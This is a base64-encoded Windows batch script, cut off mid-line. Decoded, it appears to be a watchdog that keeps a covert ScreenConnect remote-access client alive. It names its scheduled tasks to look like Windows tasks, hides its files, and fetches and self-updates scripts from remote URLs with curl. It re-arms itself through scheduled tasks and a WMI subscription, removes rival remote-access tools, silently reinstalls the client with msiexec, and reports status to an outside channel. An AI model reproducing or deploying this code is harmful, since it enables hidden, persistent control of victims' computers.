TExFRD0wIg0Kc2V0ICJQUklNX09LPTAiDQpzZXQgIkFMVF9PSz0wIg0Kc2V0ICJGT1JFSUdOX0xF
RlQ9MCINCnNldCAiRk9SRUlHTl9MSVNUPSINCnNldCAiTVNJRVhJVD1ub3QtcnVuIg0KDQpyZW0g
4pSA4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tzIHJh
Y2luZyBtc2lleGVjKSDilIDilIANCnNldCAiTVVURVg9JVdEJVx0aWNrLmxvY2siDQppZiBleGlz
dCAiJU1VVEVYJSIgKA0KICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0l
JX50QSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
aWYoKFRlc3QtUGF0aCAnJU1VVEVYJScpIC1hbmQgKCgoR2V0LURhdGUpLShHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJyVNVVRFWCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1s
dCA4KSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2
ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVu
ZGxvY2FsDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9N
JT4iJU1VVEVYJSINCg0KcmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1
cmUpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAy
PiYxDQppZiBleGlzdCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5z
PTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0l
JUwiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9XFdlclF1ZXVlU3luYyINCmlm
IG5vdCBkZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1cUGxhU2VydmVySGVhbHRoIg0KaWYgbm90
IGRlZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVxXZGlIb3N0UHJveHkiDQppZiBub3QgZGVmaW5l
ZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9XFRjcElwQ29uZmxpY3RSZXMiDQppZiBub3QgZGVmaW5lZCBN
T19BIHNldCAiTU9fQT0yIg0KaWYgbm90IGRlZmluZWQgTU9fQiBzZXQgIk1PX0I9MyINCg0KcmVt
IOKUgOKUgCBbQV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgbm90IGV4
aXN0ICIlQ1VSTCUiIHNldCAiQ1VSTD1jdXJsLmV4ZSINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJl
dm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcdGdfcmVwb3J0
Lm5ldyIgIiVURyUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXci
ICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0
Z19yZXBvcnQubmV3IiAiJVRHMiUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXHRn
X3JlcG9ydC5wczEiID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiVEdfUkVQT1JUIEJVSUxEIiAiJVdE
JVx0Z19yZXBvcnQubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcdGdfcmVwb3J0
Lm5ldyIpIGRvIGlmICUlfnpGIEdUUiAxNTAwIG1vdmUgL3kgIiVXRCVcdGdfcmVwb3J0Lm5ldyIg
IiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxDQpkZWwgL2YgL3EgIiVXRCVcdGdfcmVwb3J0
Lm5ldyIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRp
bWVvdXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUi
ID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJUNVUkwlIiAt
TCAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVXRCVcb3duX3NlY3VyZS5u
ZXciICIlT1dOU0VDMiUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9zZWN1
cmUuY21kIiA+bnVsIDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9TRUNVUkUgQlVJTEQiICIlV0QlXG93
bl9zZWN1cmUubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBpbiAoIiVXRCVcb3duX3NlY3VyZS5u
ZXciKSBkbyBpZiAlJX56RiBHVFIgODAwIG1vdmUgL3kgIiVXRCVcb3duX3NlY3VyZS5uZXciICIl
V0QlXG93bl9zZWN1cmUuY21kIiA+bnVsIDI+JjENCmRlbCAvZiAvcSAiJVdEJVxvd25fc2VjdXJl
Lm5ldyIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRp
bWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5u
dWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAtLWNv
bm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dO
TElCMiUiID5udWwgMj4mMQ0KYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9saWIucHMxIiA+bnVs
IDI+JjENCmZpbmRzdHIgL0M6Ik9XTl9MSUIgIEJVSUxEIiAiJVdEJVxvd25fbGliLm5ldyIgPm51
bCAyPiYxICYmIGZvciAlJUYgaW4gKCIlV0QlXG93bl9saWIubmV3IikgZG8gaWYgJSV+ekYgR1RS
IDE1MDAgbW92ZSAveSAiJVdEJVxvd25fbGliLm5ldyIgIiVXRCVcb3duX2xpYi5wczEiID5udWwg
Mj4mMQ0KZGVsIC9mIC9xICIlV0QlXG93bl9saWIubmV3IiA+bnVsIDI+JjENCnJlbSBzZWxmLXVw
ZGF0ZTogZG93bmxvYWQgbmV3IG93bl9tb24sIGFwcGx5IEFGVEVSIHRoaXMgdGljayAoQlVJTEQt
dmVyaWZpZWQpDQpzZXQgIlNFTEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9tb24ubmV4dCIg
IiVPV05NT04lIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbW9uLm5leHQiICIl
Q1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVxvd25f
bW9uLm5leHQiICIlT1dOTU9OMiUiID5udWwgMj4mMQ0KZmluZHN0ciAvQzoiT1dOX01PTiAgQlVJ
TEQiICIlV0QlXG93bl9tb24ubmV4dCIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGZv
ciAlJUYgaW4gKCIlV0QlXG93bl9tb24ubmV4dCIpIGRvIGlmICUlfnpGIEdUUiAxNTAwICgNCiAg
ZmMgL2IgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQog
IGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiDQopDQppZiAiJVNFTEZfVVBEJSI9PSIw
IiBkZWwgL2YgL3EgIiVXRCVcb3duX21vbi5uZXh0IiA+bnVsIDI+JjENCg0KcmVtIOKUgOKUgCBb
Ql0gcmUtYXJtIGNoYWluIDE6IG93bmVyc2hpcC1hd2FyZSAobm90IGV4aXN0ZW5jZS1vbmx5KSDi
lIDilIANCnJlbSBMMTEvTTIyOiBRdWVyeS1vbmx5IHNraXBwZWQgcmVhcm0gd2hlbiBXaW5kb3dz
IGJ1aWx0LWluIHRhc2tzIHNoYXJlZA0KcmVtIGRlZmF1bHQgbmFtZXMgKERpYWdub3Npc1xTY2hl
ZHVsZWQgZXRjLikgLT4gbW9uIG5ldmVyIHJhbiwgbm8gbG9nLg0KaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiICgNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHRhc2tzLWVuc3VyZSAtV29ya0RpciAiJVdE
JSIgLU1vblBhdGggIiVXRCVcb3duX21vbi5jbWQiYCkgZG8gKA0KICAgIGVjaG8gdGFza3NfZW5z
dXJlICUlUj4+IiVMT0clIg0KICAgIHNldCAiVEFTS1NfRU5TVVJFPSUlUiINCiAgKQ0KKQ0KaWYg
bm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0Ql
XG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5u
dWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQi
ID5udWwgMj4mMQ0KKQ0KDQpyZW0g4pSA4pSAIFtCMl0gcmUtYXJtIGNoYWluIDIgKFdNSSBzdWJz
Y3JpcHRpb24pIGlmIG1pc3Npbmcg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQppZiBleGlz
dCAiJVdEJVxvd25fbGliLnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBp
biAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJl
IC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldE
X1NUQVRFPSUlUiINCiAgaWYgL0kgIiFXRF9TVEFURSEiPT0iUkVBUk1FRCIgZWNobyB3YXRjaGRv
ZyBXTUkgUkVBUk1FRD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtFXSBleHRlcm1pbmF0ZSBm
b3JlaWduIFNDICsgZGlzYWxsb3dlZCBSTU0gKEJFRk9SRSBoZWFsL2luc3RhbGwsDQpyZW0gICAg
IHNvIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFjdGlvbiBuZXZlciBjb2xsaWRlcyB3aXRoIHJp
dmFscykg4pSA4pSADQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Q
cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdE
JVxvd25fbGliLnBzMSIgLUFjdGlvbiBleHRlcm1pbmF0ZSAtV29ya0RpciAiJVdEJSIgPj4iJUxP
RyUiIDI+JjENCnRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQpzZXQgIkZPUkVJR05fTEVGVD0w
Ig0KZm9yIC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0g
YWxsIF58IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykg
ZG8gKA0KICBzZXQgIkZQPSUlYSINCiAgc2V0ICJGUD0hRlA6ID0hIg0KICBpZiAvSSBub3QgIiFG
UCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiICgNCiAgICBzZXQg
L2EgQ09VTlQrPTENCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAgc2V0ICJGT1JFSUdO
X0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4i
JUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKUgCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHByaW0v
YWx0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tlbnM9MSwyIGRlbGlt
cz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUp
IiBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0KICBzZXQgIklOU1RBTExFRD0x
Ig0KICBzZXQgIlBSSU1TVEFURT0lJWIiDQopDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwg
MSAoDQogIHNldCAiUFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQrPTENCikNCnNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxl
dmVsIDEgc2V0IC9hIENPVU5UKz0xDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVB
TFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAi
QUxUX09LPTEiDQoNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgN
CiAgZWNobyBzdmMgaGVhbCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBzdGFydCAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDYgL25vYnJl
YWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwg
ZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0x
Ig0KKQ0KcmVtIE0xNjogc3RpbGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lTVEVSRUQgcHJv
ZHVjdCAobXNpZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2Vy
dmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykNCmlmICIlSU5T
VEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgZXNjYWxhdGUg
cmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxs
IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtE
aXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+bnVsDQog
IHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5O
SU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiDQopDQpyZW0g
TTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVudHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVu
IGJ5IGFuIFNDLWZhbWlseQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBE
ZWxldGUgaXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUNCnJlbSBmcmVzaC1pbnN0YWxsIGxhZGRl
ciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0aW5nICJ3b250IHN0YXJ0IiBmb3JldmVyLg0KaWYgIiVJ
TlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKA0KICBzZXQgIlJFR1NUQVRFPXVu
a25vd24iDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0iICUl
UiBpbiAoJ3Bvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAt
RnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiJykgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQog
IGVjaG8gb3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSINCiAgaWYgL0kgIiFSRUdTVEFU
RSEiPT0ibm8iICgNCiAgICBlY2hvIG9ycGhhbl9zZXJ2aWNlX2RlbGV0ZT4+IiVMT0clIg0KICAg
IHNjIGRlbGV0ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0K
ICAgIHNldCAiSU5TVEFMTEVEPTAiDQogICkNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAi
JVBSSU1fT0slIj09IjAiICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
biBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAic3ZjLXdvbnQt
c3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlNjcmVlbkNvbm5lY3QgKCVL
RUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0YXJ0Ig0KICBnb3RvIDpBZnRlckhlYWwNCikN
CmlmICIlSU5TVEFMTEVEJSI9PSIxIiBnb3RvIDpBZnRlckhlYWwNCg0KcmVtIOKUgOKUgCBbRF0g
cHJpbWFyeSBTQyBtaXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTTEyOiBGSVJT
VCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVzIHNlcnZpY2Ugd2l0aG91
dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBmcmVzaCBtc2lleGVjIGluc3RhbGwg
b25seSBhcyBmYWxsYmFjay4NCmVjaG8gc3ZjIG1pc3NpbmcgLSBoZWFsIGJlZ2luPj4iJUxPRyUi
DQpjYWxsIDpSZXBhaXJSZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
cm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBn
b3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJlc2ggL2kgaWYgcHJvZHVjdCBzdGlsbCBy
ZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBjYW4gd2lwZSBBTFQNCnNldCAiUkVHU1RBVEU9dW5r
bm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGlt
cz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0
ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJSRUdTVEFURT0l
JVIiDQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3JlZ2lzdGVy
ZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSAtRXh0
cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIlBy
aW1hcnkgcmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVmdXNl
ZCAvaSB0byBwcm90ZWN0IEFMVCINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQppZiAiJUlOU1RBTExF
RCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiINCmlmICIlSU5TVEFM
TEVEJSI9PSIwIiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJBTkRPTSUiICJnaXRo
dWItcGtnIg0KaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtH
MiUiICJqc2RlbGl2ci1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0KICByZW0gcHJlZmVy
IHdvcmtlci1jYWNoZWQgLnd1Y2FjaGVccGtnLm1zaSAoc2FtZSBiaW5hcnkgYXMgZGVwbG95KQ0K
ICBhdHRyaWIgLWggLXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQ0KICBmb3IgJSVGIGluICgi
JU1TSUNBQ0hFJSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBlY2hvIHd1Y2FjaGVf
cGtnX3JldHJ5Pj4iJUxPRyUiDQogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIgPm51bCAyPiYx
DQogICAgY29weSAveSAiJU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjENCiAgKQ0KICBmb3Ig
JSVGIGluICgiJU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgZWNobyBjYWNo
ZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xpY3kNCiAgICBtc2ll
eGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3Vw
cHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0KICAgIHNldCAiTVNJRVhJ
VD0hRVJST1JMRVZFTCEiDQogICAgZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4i
JUxPRyUiDQogICAgaWYgIiFNU0lFWElUISI9PSIxNjE4IiAoDQogICAgICB0aW1lb3V0IC90IDMw
IC9ub2JyZWFrID5udWwNCiAgICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBB
TExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ci
ID5udWwgMj4mMQ0KICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICAgIGVjaG8g
Y2FjaGVfcmV0cnkxNjE4X2V4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgKQ0KICAgIGNhbGwg
OldhaXRTdmMNCiAgKQ0KKQ0KY2FsbCA6UmVzdG9yZUFsdA0KaWYgIiVJTlNUQUxMRUQlIj09IjAi
ICgNCiAgaWYgZXhpc3QgIiVXRCVcbXNpX2hlYWwubG9nIiAoDQogICAgZWNobyAtLS0gbXNpX2hl
YWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtQ29tbWFuZCAiR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXG1zaV9o
ZWFsLmxvZycgLVRhaWwgMTAiID4+IiVMT0clIiAyPiYxDQogICkNCiAgaWYgbm90IGRlZmluZWQg
TVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFpbCINCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxl
IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25f
bGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1F
eHRyYSAibXNpLWZhaWxlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgRkFJTCAiTVNJIGlu
c3RhbGwgZmFpbGVkIG9uIGFsbCBzb3VyY2VzIChtc2lleGVjIGV4aXQgJU1TSUVYSVQlKSINCikg
ZWxzZSAoDQogIGVjaG8gc3ZjIHJlc3RvcmVkPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJv
ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
b3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVS
JSAtRXh0cmEgInJlc3RvcmVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBSRVNUT1JFRCAi
U2NyZWVuQ29ubmVjdCByZWluc3RhbGxlZCBPSyINCikNCg0KOkFmdGVySGVhbA0KcmVtIE0xNjog
QUxUIHByZXNlbnQtYnV0LXN0b3BwZWQgLT4gcmVzdGFydCwgdGhlbiByZXBhaXItYnktR1VJRCAo
ZXZlcnkgdGljaykNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+
bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIGVycm9ybGV2
ZWwgMSAoDQogICAgZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWlyPj4iJUxPRyUiDQog
ICAgbmV0IHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjEN
